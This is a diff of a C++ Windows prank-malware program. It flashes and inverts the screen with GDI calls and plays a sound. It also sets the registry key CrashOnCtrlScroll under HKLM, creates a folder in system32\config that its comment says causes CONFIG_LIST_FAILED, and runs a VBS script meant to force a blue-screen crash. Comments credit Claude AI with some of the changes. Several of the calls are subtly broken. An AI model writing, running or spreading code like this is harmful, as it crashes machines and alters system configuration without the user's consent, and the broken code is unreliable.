@@ -1,11 +1,13 @@
-#include <stdlib.h> // for system();
-#include <windows.h> // for gdi screen glitches
-#include <iostream> // for beep
+#include <stdlib.h>     // for system(); and rand();
+#include <windows.h>   // for gdi screen glitches
+#include <mmsystem.h> // didn't know how to synchronise, claude ai told me to do this
+#pragma comment(lib, "winmm.lib") 
 
 int main()
 {
+    srand(time(0)); // and this, because i don't want the same effects every time
     HDC hdc = GetDC(NULL);
-    int bv = rand % 2 /*random binary number selection (1 and 0)*/, w = GetSystemMetrics(SM_CXSCREEN)/*screen width*/, h = GetSystemMetrics(SM_CYSCREEN)/*screen height*/;
+    int bv = rand() % 2, w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN); 
     system("cd C:\\Windows\\system32\\config");
     if (bv == 1)
     {
@@ -16,12 +18,14 @@ int main()
         system("mkdir OSDATA"); // for CONFIG_LIST_FAILED
     }
     system("reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\kbdhid\\Parameters /v CrashOnCtrlScroll /d 1"); // for MANUALLY_INITIATED_CRASH(1)
-    for (int a = 0; a < 20; a++)
+    PlaySound(L".\\html5bytebeat.wav", NULL, SND_FILENAME | SND_ASYNC); // this is better than std::cout << "\a"; or Beep(freq, del); :) (claude told me to do this as well)
+    for (int a = 0; a < 30; a++)
     {
-        BitBlt(hdc, w, h, rand() % w + 1, rand () % h + 1, 1920, 1080, bv, STRCOPY); // copy screen image (not exactly the same)
-        PatBlt(hdc, w, h, 1920 * 1080, PATINVERT); // invert screen color
-        std::cout << "\a"; // for newer programmers, this makes a beep sound instead of outputting the string "\a"
+        BitBlt(hdc, w, h, rand() % w + 1, rand () % h + 1, hdc, w * h, bv, SRCCOPY); // glitch screen
+        PatBlt(hdc, w, h, 1920, 1080, PATINVERT); // invert screen colour
+        Sleep(1000); // wait for 1 second
     }
+    ReleaseDC(NULL, hdc);
     system("cscript ctrlscrolllock.vbs //nologo"); // trigger bsod MANUALLY_INITIATED_CRASH(1) then BAD_SYSTEM_CONFIG_INFO or CONFIG_LIST_FAILED
     return 0;
 }
